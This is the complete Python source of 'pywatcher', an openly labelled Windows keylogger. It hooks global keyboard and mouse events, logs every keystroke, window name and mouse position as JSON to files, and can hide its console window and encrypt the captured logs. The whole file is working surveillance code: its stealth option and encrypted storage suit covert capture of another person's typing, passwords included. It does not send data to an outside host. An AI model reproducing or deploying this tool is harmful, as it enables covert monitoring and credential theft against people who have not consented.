#!/usr/bin/env python
# -*- coding: utf-8 -*-

import win32console
import win32gui
import win32api
import win32con
import json
import pythoncom
import pyWinhook
import queue
from cryptography.fernet import Fernet
from functools import partial
import threading
import argparse
import collections

__author__ = "Jorge Alarcon"
__copyright__ = "Copyright (c) 2020 jorge4larcon"
__credits__ = ["Jorge Alarcon"]
__license__ = "MIT"
__version__ = "1.0.1"
__maintainer__ = "Jorge Alarcon"
__email__ = "jorge4larcon@gmail.com"
__status__ = "Prototype"

ENCODING = 'UTF-8'

KEYBOARD_EVENTS = queue.Queue()
MOUSE_EVENTS = queue.Queue()

KEYWORD_STOP_ENABLED = False
KEYWORD_QUEUE = None

STOP_EVENT = threading.Event()


def onkeyboardevent(event):
    KEYBOARD_EVENTS.put(event)
    if KEYWORD_STOP_ENABLED:
        KEYWORD_QUEUE.put(event.Ascii)

    return True


def onmouseevent(event):
    MOUSE_EVENTS.put(event)
    return True


def keyboard_event_to_dict(event):
    return {
        'message_name': event.MessageName,
        'message': event.Message,
        'time': event.Time,
        'window': event.Window,
        'window_name': event.WindowName,
        'ascii': event.Ascii,
        'key': event.Key,
        'key_id': event.KeyID,
        'scan_code': event.ScanCode,
        'extended': event.Extended,
        'injected': event.Injected,
        'alt': event.Alt,
        'transition': event.Transition
    }


def mouse_event_to_dict(event):
    return {
        'message_name': event.MessageName,
        'message': event.Message,
        'time': event.Time,
        'window': event.Window,
        'window_name': event.WindowName,
        'position': event.Position,
        'wheel': event.Wheel,
        'injected': event.Injected
    }


def get_events(events_queue, process_fn):
    processed_events = []
    while True:
        try:
            event = events_queue.get(block=False)
            processed_event = process_fn(event)
            processed_events.append(processed_event)
            events_queue.task_done()
        except queue.Empty:
            break

    return processed_events


def load_events_from_file(file, key, decrypt):
    try:
        with open(file, 'rb') as file:
            data = file.read()

        if decrypt:
            fernet = Fernet(key)
            data = fernet.decrypt(data)

        text = data.decode(ENCODING)
        events = json.loads(text)
    except Exception:
        events = []

    return events


def append_events_to_file(file, events, key, encrypt):
    str_events = json.dumps(events)
    encoded_events = str_events.encode(ENCODING)

    if encrypt:
        fernet = Fernet(key)
        encoded_events = fernet.encrypt(encoded_events)

    with open(file, 'wb') as file:
        file.write(encoded_events)


def log_events_to_file(file, key, get_events_fn, encrypt, decrypt):
    events = load_events_from_file(file, key, decrypt)
    events += get_events_fn()
    append_events_to_file(file, events, key, encrypt)


def start_listening():
    global STOP_EVENT
    thread_id = win32api.GetCurrentThreadId()

    def stop():
        STOP_EVENT.wait()
        win32api.PostThreadMessage(thread_id, win32con.WM_QUIT, 0, 0)

    stopper = threading.Thread(target=stop)
    stopper.start()
    hm = pyWinhook.HookManager()
    hm.KeyDown = onkeyboardevent
    hm.MouseAll = onmouseevent
    hm.HookMouse()
    hm.HookKeyboard()
    pythoncom.PumpMessages()
    stopper.join()


def keyword_stopper(stopkw):
    global STOP_EVENT
    actual_keyword = collections.deque(maxlen=len(stopkw))
    while not STOP_EVENT.wait(1):
        while True:
            try:
                ascii_key = chr(KEYWORD_QUEUE.get(block=False))
                if actual_keyword.maxlen == len(actual_keyword):
                    actual_keyword.popleft()

                actual_keyword.append(ascii_key)
                KEYWORD_QUEUE.task_done()
                if ''.join(actual_keyword) == stopkw:
                    STOP_EVENT.set()
                    break
            except queue.Empty:
                break


def log_events(keyboard_log_file, mouse_log_file, key, encrypt, decrypt):
    log_events_to_file(
        keyboard_log_file, key,
        partial(get_events, KEYBOARD_EVENTS, keyboard_event_to_dict), encrypt,
        decrypt)
    log_events_to_file(
        mouse_log_file, key,
        partial(get_events, MOUSE_EVENTS, mouse_event_to_dict), encrypt,
        decrypt)


def start_logging(keyboard_log_file, mouse_log_file, key, encrypt, decrypt,
                  interval):
    global STOP_EVENT
    while not STOP_EVENT.wait(interval):
        log_events(keyboard_log_file, mouse_log_file, key, encrypt, decrypt)

    log_events(keyboard_log_file, mouse_log_file, key, encrypt, decrypt)


def check_args(args):
    try:
        with open(args.klog, 'ab') as file:
            pass

        with open(args.mlog, 'ab') as file:
            pass

    except (PermissionError, IOError):
        raise


def run(args):
    check_args(args)
    win = win32console.GetConsoleWindow()
    listener = threading.Thread(target=start_listening)
    logger = threading.Thread(target=start_logging, args=(
        args.klog, args.mlog, args.key, bool(args.key), bool(args.key),
        args.cpoint
    ))
    timestopper = threading.Timer(args.time, lambda: STOP_EVENT.set())
    listener.start()
    logger.start()
    timestopper.start()
    if args.stopkeyword:
        global KEYWORD_QUEUE, KEYWORD_STOP_ENABLED
        KEYWORD_STOP_ENABLED = True
        KEYWORD_QUEUE = queue.Queue()
        kwstopper = threading.Thread(
            target=keyword_stopper, args=(args.stopkeyword,))
        kwstopper.start()
        print('Logging keyboard and mouse events...')
        if args.hide or args.har:
            win32gui.ShowWindow(win, 0)
        kwstopper.join()
        timestopper.cancel()
    else:
        print('Logging keyboard and mouse events...')
        if args.hide or args.har:
            win32gui.ShowWindow(win, 0)

    timestopper.join()
    listener.join()
    logger.join()
    if args.har:
        win32gui.ShowWindow(win, 1)


def main():
    parser = argparse.ArgumentParser(
        description='Log mouse and keyboard events in json format to two files',
        prog='pywatcher',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
        epilog='This Keylogger runs by 1 hour saving mouse and keyboard'
               ' logs every 16 seconds, but you can modify its behaviour.'
               ' It can also be stopped if you provide the `stopkeyword` '
               'and you type it after starting the program. This program '
               'can also encryt the files if you provide a key.')
    parser.add_argument(
        'stopkeyword', help='type this when you want to stop logging',
        type=str, default='', nargs='?')
    parser.add_argument(
        '-k', '--keyboard-logfile', type=str, default='keyboard.log',
        help='the log file for the keyboard events', dest='klog')
    parser.add_argument(
        '-m', '--mouse-logfile', type=str, default='mouse.log',
        help='the log file for the mouse events', dest='mlog')
    parser.add_argument(
        '-c', '--checkpoint', type=int, default=16,
        help='how often should logs be saved? (in seconds)',
        dest='cpoint', metavar='CHECKPOINT')
    parser.add_argument(
        '-t', '--time', type=int, default=3600,
        help='how much time the keylogger will be running? (in seconds)',
        dest='time')
    parser.add_argument(
        '--hide', help='hide the keylogger', default=False, action='count',
        dest='hide')
    parser.add_argument(
        '--hide-and-reveal', help='hide the keylogger, reveal when done', default=False, action='count',
        dest='har')
    parser.add_argument(
        '--key', help='the key to encrypt the logs', default='', dest='key')
    parser.add_argument('--version', action='version', version='%(prog)s 1.0')
    args = parser.parse_args()
    run(args)


if __name__ == '__main__':
    main()
